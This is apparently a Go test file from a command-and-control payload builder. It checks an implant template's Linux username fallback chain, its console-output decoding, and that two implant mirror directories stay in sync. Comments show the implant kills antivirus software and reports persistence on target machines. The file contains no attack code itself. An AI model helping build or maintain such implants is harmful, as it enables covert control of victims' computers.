package builder

// 植入端模板的"Linux 用户名兜底链"与"输出编码归一"回归测试。
//
// 为什么不能直接 `go test ./implant/...`：植入端模板是**独立 module**，而且 main.go
// 里还有构建期占位符（{{STARTUP_DELAY_MIN}} 等）—— 模板目录本身不是可编译的 Go 包。
// 但 username.go 是纯 stdlib 纯函数（env/passwd/uid 全部从参数进来），所以这里把它
// 和模板自带单测复制到一个临时 module 里跑：**跑的就是会被编进载荷的那份源码**，
// 而不是测试里另抄一份实现（抄一份的两套逻辑迟早漂移）。

import (
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"
)

// implantTemplateUsernames 模板里参与"用户名兜底链"的文件。
var implantUsernameFiles = []string{"username.go", "username_test.go"}

// TestImplantUsernameResolver 在临时 module 里跑模板自带的 username_test.go。
func TestImplantUsernameResolver(t *testing.T) {
	if _, err := exec.LookPath("go"); err != nil {
		t.Skip("go 不在 PATH 上，跳过（本用例需要调用 go test 编译模板里的纯函数）")
	}
	tmpDir := t.TempDir()

	for _, name := range implantUsernameFiles {
		src, err := os.ReadFile(filepath.Join("implant", name))
		if err != nil {
			t.Fatalf("缺 %s：%v（模板必须保留该文件，用户名单测依赖它）", name, err)
		}
		// 模板源码是 package main；临时 module 里改成独立包，测试文件与实现同包。
		// 按"整行等于 package main"替换，避免碰巧命中文档注释里的同一串字。
		lines := strings.Split(string(src), "\n")
		replaced := false
		for i, line := range lines {
			if strings.TrimSpace(line) == "package main" {
				lines[i] = "package usernamecheck"
				replaced = true
				break
			}
		}
		if !replaced {
			t.Fatalf("%s 里没有 package main 声明，无法安全改包名", name)
		}
		if err := os.WriteFile(filepath.Join(tmpDir, name), []byte(strings.Join(lines, "\n")), 0o644); err != nil {
			t.Fatalf("write %s: %v", name, err)
		}
	}
	goMod := "module usernamecheck\n\ngo 1.20\n"
	if err := os.WriteFile(filepath.Join(tmpDir, "go.mod"), []byte(goMod), 0o644); err != nil {
		t.Fatalf("write go.mod: %v", err)
	}

	cmd := exec.Command("go", "test", "-count=1", "-vet=off", ".")
	cmd.Dir = tmpDir
	// GOTOOLCHAIN=local：临时 module 只依赖 stdlib，禁止为了 go 指令版本去联网换工具链。
	cmd.Env = append(os.Environ(),
		"GO111MODULE=on",
		"GOWORK=off",
		"GOTOOLCHAIN=local",
	)
	out, err := cmd.CombinedOutput()
	if err != nil {
		t.Fatalf("模板 username 单测失败（Linux 用户名 unknown 的兜底链坏了）：%v\n%s", err, out)
	}
	if !strings.Contains(string(out), "ok ") {
		t.Fatalf("go test 未返回 ok（可能没有跑到任何用例）：\n%s", out)
	}
}

// TestImplantUsernameChainWired 兜底链必须真的接进 platform_unix.go（而不是只存在于单测里）。
//
// 历史 bug：getUsername 只看 os.Getenv("USER")，无登录环境的 Linux 会话（systemd/cron/
// docker exec）一律 unknown。下面这几个锚点任何一条被删掉，会话列表就会退回 unknown。
func TestImplantUsernameChainWired(t *testing.T) {
	src, err := os.ReadFile(filepath.Join("implant", "platform_unix.go"))
	if err != nil {
		t.Fatalf("read platform_unix.go: %v", err)
	}
	code := string(src)
	for _, want := range []string{
		"getUsernameUnix(os.Getuid(), os.Getenv)", // 接上纯函数链
		`os.Getenv("HOME")`,                       // 其余平台接口保持可用
	} {
		if !strings.Contains(code, want) {
			t.Errorf("platform_unix.go 缺少 %q：Linux 用户名会退回 unknown", want)
		}
	}
	// 不允许退回"只读环境变量 + unknown"的老实现。
	if strings.Contains(code, `username = "unknown"`) {
		t.Error("platform_unix.go 仍保留旧的 unknown 兜底写法，应改为 username.go 的兜底链")
	}

	username, err := os.ReadFile(filepath.Join("implant", "username.go"))
	if err != nil {
		t.Fatalf("read username.go: %v", err)
	}
	for _, anchor := range []string{
		`"USER"`, `"LOGNAME"`, `"SUDO_USER"`, // 环境变量三档
		`passwdPath = "/etc/passwd"`, // uid → passwd 解析
		`"uid:" + strconv.Itoa(uid)`, // 拿不到名字时至少给 uid，不写 unknown
	} {
		if !strings.Contains(string(username), anchor) {
			t.Errorf("username.go 缺少兜底链锚点 %q", anchor)
		}
	}
}

// TestImplantOutputDecodingWired 输出编码归一必须是"逐行判 UTF-8"（decodeConsoleText），
// 而不是回到"整串 gbkToUTF8"。这是"杀软击杀 / 启动项回显乱码"的根因回归点：
// 整串转会把植入端自己写的 UTF-8 中文（击杀/持久化成功）打成"鍑绘潃 / 娉ㄥ唽…"。
func TestImplantOutputDecodingWired(t *testing.T) {
	mainSrc, err := os.ReadFile(filepath.Join("implant", "main.go"))
	if err != nil {
		t.Fatalf("read main.go: %v", err)
	}
	code := stripLineComments(string(mainSrc))
	if strings.Contains(code, "output = string(gbkToUTF8([]byte(output)))") {
		t.Fatal("main.go 仍对整串输出做 GBK→UTF-8：会把植入端 UTF-8 中文回执打成乱码")
	}
	if !strings.Contains(code, "output = decodeConsoleText(output)") {
		t.Fatal("main.go 未接 decodeConsoleText（逐行判 UTF-8 的输出编码归一）")
	}

	win, err := os.ReadFile(filepath.Join("implant", "platform_windows.go"))
	if err != nil {
		t.Fatalf("read platform_windows.go: %v", err)
	}
	winCode := stripLineComments(string(win))
	for _, anchor := range []string{
		"func decodeConsoleText(s string) string",
		"utf8.ValidString(s)",    // 整串合法 → 原样返回（幂等）
		"utf8.ValidString(line)", // 逐行判定：合法行不动，非法行才转
	} {
		if !strings.Contains(winCode, anchor) {
			t.Errorf("platform_windows.go 的 decodeConsoleText 缺少锚点 %q", anchor)
		}
	}
}

// TestImplantMirrorFilesIdentical 两份植入端镜像（internal/server/builder/implant 与
// release/implant）的 .go 文件必须逐字节一致。
//
// 为什么要守：服务端构建器读的是前者，而 release/implant 是发布/独立构建用的镜像。
// 只改一份会得到"服务端构建的载荷修好了、release 里那份还是旧的"这种最难查的偏差。
func TestImplantMirrorFilesIdentical(t *testing.T) {
	entries, err := os.ReadDir("implant")
	if err != nil {
		t.Fatalf("read implant dir: %v", err)
	}
	checked := 0
	for _, e := range entries {
		if e.IsDir() || !strings.HasSuffix(e.Name(), ".go") {
			continue
		}
		tmpl, err := os.ReadFile(filepath.Join("implant", e.Name()))
		if err != nil {
			t.Fatalf("read template %s: %v", e.Name(), err)
		}
		mirrorPath := filepath.Join("..", "..", "..", "release", "implant", e.Name())
		mirror, err := os.ReadFile(mirrorPath)
		if err != nil {
			t.Fatalf("release/implant 缺 %s：%v（两份镜像必须完整同步）", e.Name(), err)
		}
		if string(tmpl) != string(mirror) {
			t.Errorf("%s 在两份镜像之间不一致：请同步 internal/server/builder/implant 与 release/implant", e.Name())
		}
		checked++
	}
	if checked == 0 {
		t.Fatal("没有可比对的 .go 文件（路径不对？）")
	}
}
